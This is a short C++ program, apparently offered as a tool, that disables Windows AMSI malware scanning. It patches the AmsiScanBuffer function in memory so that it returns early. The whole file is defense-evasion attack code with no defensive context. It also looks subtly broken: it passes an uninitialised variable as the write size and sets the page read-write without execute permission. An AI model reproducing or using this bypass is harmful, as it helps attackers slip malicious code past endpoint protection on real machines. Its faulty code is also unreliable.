#include <Windows.h>
#include <iostream>

int main(int argc, char** argv)
{
	SetConsoleTitleA("Amsi.Dll bypass");
	std::cerr << "[+] Amsi bypass by GvhVisor + CodeForge.io" << std::endl;
	HINSTANCE amsi = LoadLibraryA("amsi.dll");
	FARPROC amsiscanroutine = GetProcAddress(amsi, "AmsiScanBuffer");
	CHAR patch[5] = { 0x31, 0xC0, 0xC3, 0x90, 0x90 };
	DWORD old_protection;
	VirtualProtect((LPVOID)amsiscanroutine, 5, PAGE_READWRITE, &old_protection);
	SIZE_T bytes_written;
	WriteProcessMemory(GetCurrentProcess(), (LPVOID)amsiscanroutine, patch, bytes_written, &bytes_written);
}
